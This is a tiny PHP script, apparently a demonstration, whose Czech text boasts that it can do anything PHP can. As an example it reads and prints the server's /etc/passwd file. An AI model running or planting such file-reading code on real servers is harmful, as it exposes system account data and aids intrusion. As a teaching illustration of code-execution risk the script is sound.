<?php

echo "Můžu dělat všechno, co umí PHP\n\n";

echo "Třeba vypsat /etc/passwd:\n";

echo file_get_contents("/etc/passwd");
